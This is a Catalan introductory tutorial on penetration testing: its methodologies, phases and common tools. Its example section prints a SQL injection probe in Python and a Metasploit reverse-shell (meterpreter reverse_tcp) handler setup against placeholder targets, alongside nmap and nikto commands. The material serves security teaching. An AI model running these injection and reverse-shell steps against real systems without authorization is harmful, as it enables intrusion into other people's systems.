Introducció a les Proves de Penetració

Les proves de penetració, també conegudes com a pentesting, són un conjunt de tècniques i metodologies utilitzades per avaluar la seguretat d'un sistema informàtic, xarxa o aplicació web. L'objectiu principal és identificar i explotar vulnerabilitats per determinar si un atacant podria comprometre la seguretat del sistema.

Importància de les Proves de Penetració

  • Identificació de Vulnerabilitats: Permeten descobrir fallades de seguretat abans que els atacants les explotin.
  • Compliment Normatiu: Ajuden a complir amb normatives i estàndards de seguretat com PCI-DSS, HIPAA, i GDPR.
  • Millora Contínua: Proporcionen informació valuosa per millorar les polítiques i procediments de seguretat.
  • Protecció d'Actius: Asseguren que les dades i recursos crítics estiguin protegits contra accessos no autoritzats.

Metodologies de Proves de Penetració

Caixa Negra

  • Descripció: L'avaluador no té coneixement previ del sistema.
  • Avantatges: Simula un atac real des de la perspectiva d'un atacant extern.
  • Desavantatges: Pot ser menys eficient en identificar totes les vulnerabilitats a causa de la manca d'informació.

Caixa Blanca

  • Descripció: L'avaluador té ple coneixement del sistema, incloent-hi el codi font i l'arquitectura.
  • Avantatges: Permet una avaluació exhaustiva i detallada.
  • Desavantatges: No simula un atac realista des de la perspectiva d'un atacant extern.

Caixa Grisa

  • Descripció: L'avaluador té accés parcial a la informació del sistema.
  • Avantatges: Equilibri entre les metodologies de caixa negra i caixa blanca.
  • Desavantatges: Pot no ser tan exhaustiva com la caixa blanca ni tan realista com la caixa negra.

Fases d'una Prova de Penetració

  1. Reconeixement:

    • Objectiu: Recopilar informació sobre l'objectiu.
    • Tècniques: OSINT (Open Source Intelligence), escaneig de ports, enumeració de serveis.

  2. Escaneig:

    • Objectiu: Identificar vulnerabilitats potencials.
    • Eines: Nmap, Nessus, OpenVAS.

  3. Explotació:

    • Objectiu: Comprometre el sistema utilitzant les vulnerabilitats identificades.
    • Eines: Metasploit, SQLmap, Burp Suite.

  4. Post-Explotació:

    • Objectiu: Avaluar l'impacte de l'explotació i mantenir l'accés.
    • Tècniques: Escalació de privilegis, moviment lateral.

  5. Informe:

    • Objectiu: Documentar les troballes i proporcionar recomanacions.
    • Contingut: Descripció de vulnerabilitats, evidències, impacte, recomanacions.

Exemple de Prova de Penetració en una Aplicació Web

Pas 1: Reconeixement

# Usant Nmap per escanejar ports oberts
nmap -sS -sV -T4 target_ip

Pas 2: Escaneig

# Usant Nikto per escanejar vulnerabilitats en el servidor web
nikto -h http://target_ip

Pas 3: Explotació

# Exemple d'explotació d'una vulnerabilitat SQL Injection
import requests

url = "http://target_ip/vulnerable_page.php?id=1' OR '1'='1"
response = requests.get(url)
if "Welcome" in response.text:
    print("SQL Injection successful!")

Pas 4: Post-Explotació

# Usant Metasploit per obtenir una shell reversa
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

Pas 5: Informe

  • Vulnerabilitat: SQL Injection en vulnerable_page.php
  • Impacte: Permet accés no autoritzat a la base de dades.
  • Recomanació: Utilitzar consultes preparades i validar l'entrada de l'usuari.

Conclusió

Les proves de penetració són una eina crucial per avaluar i millorar la seguretat de sistemes i aplicacions. En seguir una metodologia estructurada i utilitzar eines adequades, els professionals de TI poden identificar i mitigar vulnerabilitats abans que siguin explotades per atacants malintencionats. La pràctica regular de pentesting contribueix significativament a la protecció dels actius i dades crítiques d'una organització.
